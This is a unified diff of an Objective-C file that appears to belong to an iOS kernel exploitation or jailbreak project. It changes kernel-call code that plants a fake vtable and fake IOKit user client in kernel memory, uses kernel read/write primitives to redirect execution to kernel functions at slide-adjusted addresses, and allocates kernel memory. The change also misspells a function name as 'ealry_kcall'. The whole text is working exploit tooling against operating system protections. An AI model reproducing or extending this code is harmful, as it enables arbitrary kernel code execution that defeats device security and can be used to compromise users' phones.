@@ -8,9 +8,9 @@
 #import <Foundation/Foundation.h>
 #include "kcall.h"
 
-static uint64_t fake_vtable = 0;
-static uint64_t fake_client = 0;
-static io_connect_t user_client = 0;
+uint64_t fake_vtable = 0;
+uint64_t fake_client = 0;
+io_connect_t user_client = 0;
 
 uint64_t kalloc_scratchbuf = 0;
 
@@ -68,7 +68,7 @@ bool setup_client(void) {
     return true;
 }
 
-uint64_t eary_kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
+uint64_t ealry_kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
     uint64_t offx20 = kread64_kfd(fake_client + 0x40);
     uint64_t offx28 = kread64_kfd(fake_client + 0x48);
     kwrite64_kfd(fake_client + 0x40, x0);
@@ -112,7 +112,7 @@ uint64_t mach_kalloc_init(void) {
     
     uint64_t unstable_scratchbuf = dirty_kalloc(100);
     
-    kern_return_t ret = (kern_return_t)eary_kcall(mach_vm_alloc + get_kernel_slide(),
+    kern_return_t ret = (kern_return_t)ealry_kcall(mach_vm_alloc + get_kernel_slide(),
           kernel_map,
           unstable_scratchbuf,
           0x4000,
@@ -138,7 +138,7 @@ uint64_t mach_kalloc(size_t size) {
     
     uint64_t kernel_map = get_kernel_map();
         
-    kern_return_t ret = (kern_return_t)eary_kcall(mach_vm_alloc + get_kernel_slide(),
+    kern_return_t ret = (kern_return_t)ealry_kcall(mach_vm_alloc + get_kernel_slide(),
           kernel_map,
           kalloc_scratchbuf,
           size,
@@ -161,9 +161,18 @@ uint64_t clean_dirty_kalloc(uint64_t addr, size_t size) {
     return 0;
 }
 
-bool init_kcall(void) {
+bool init_kcall(bool ealry) {
+    if(!ealry) {
+        uint64_t allocated_mem = mach_kalloc(0x2000);
+        
+        fake_vtable = allocated_mem;
+        fake_client = allocated_mem + 0x1000;
+        
+        IOServiceClose(user_client);
+        
+        clean_dirty_kalloc(empty_kdata, 0x2000);
+    }
     if(!setup_client())
         return false;
-    
     return true;
 }
